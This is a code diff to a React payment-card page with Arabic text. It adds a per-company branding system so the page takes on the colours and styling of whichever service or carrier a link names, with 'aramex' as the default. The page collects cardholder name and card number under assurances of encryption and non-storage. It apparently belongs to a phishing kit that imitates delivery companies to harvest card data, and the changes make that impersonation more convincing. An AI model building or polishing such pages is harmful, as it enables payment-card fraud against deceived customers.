@@ -10,6 +10,7 @@ import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
 import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 
 const PaymentCard = () => {
   const { id, paymentId } = useParams();
@@ -29,6 +30,11 @@ const PaymentCard = () => {
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const enhancedBranding = getBrandingByCompany(serviceKey);
+  
+  // Use enhanced branding if available, otherwise use service branding
+  const colors = enhancedBranding?.colors || branding?.colors || { primary: '#DC291E', secondary: '#8B1A12' };
+  const gradients = enhancedBranding?.gradients || { primary: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})` };
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -101,7 +107,7 @@ const PaymentCard = () => {
       className="min-h-screen py-4 sm:py-12" 
       dir="rtl"
       style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+        background: `linear-gradient(135deg, ${colors.primary}08, ${colors.secondary}08)`
       }}
     >
       <div className="container mx-auto px-3 sm:px-4">
@@ -134,16 +140,14 @@ const PaymentCard = () => {
           <div className="text-center mb-3 sm:mb-6">
             <Badge 
               className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white"
-              style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-              }}
+              style={{ background: gradients.primary }}
             >
               <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
               <span>معاملة آمنة ومشفّرة</span>
             </Badge>
           </div>
           
-          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
+          <Card className="p-4 sm:p-8 shadow-elevated border-t-4" style={{ borderTopColor: colors.primary, boxShadow: enhancedBranding?.shadows.lg || '0 20px 25px -5px rgba(0, 0, 0, 0.1)' }}>
             <div className="flex items-center gap-2 sm:gap-3 mb-4 sm:mb-6">
               <div 
                 className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg sm:rounded-xl flex items-center justify-center"
@@ -165,13 +169,13 @@ const PaymentCard = () => {
             <div 
               className="rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6 flex items-start gap-2"
               style={{
-                background: `${branding.colors.primary}10`,
-                border: `1px solid ${branding.colors.primary}30`
+                background: `${colors.primary}10`,
+                border: `1px solid ${colors.primary}30`
               }}
             >
               <AlertCircle 
                 className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" 
-                style={{ color: branding.colors.primary }}
+                style={{ color: colors.primary }}
               />
               <p className="text-xs sm:text-sm" style={{ color: branding.colors.primary }}>
                 بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
@@ -190,8 +194,8 @@ const PaymentCard = () => {
                   onChange={(e) => setCardName(e.target.value.toUpperCase())}
                   className="h-10 sm:h-12 text-sm sm:text-base border-2 focus:ring-2 transition-all"
                   style={{
-                    borderColor: `${branding.colors.primary}40`,
-                    '--tw-ring-color': `${branding.colors.primary}50`
+                    borderColor: `${colors.primary}40`,
+                    '--tw-ring-color': `${colors.primary}50`
                   } as React.CSSProperties}
                 />
               </div>
@@ -210,8 +214,8 @@ const PaymentCard = () => {
                   inputMode="numeric"
                   className="h-10 sm:h-12 text-sm sm:text-base tracking-wider border-2 focus:ring-2 transition-all font-mono"
                   style={{
-                    borderColor: `${branding.colors.primary}40`,
-                    '--tw-ring-color': `${branding.colors.primary}50`
+                    borderColor: `${colors.primary}40`,
+                    '--tw-ring-color': `${colors.primary}50`
                   } as React.CSSProperties}
                 />
               </div>
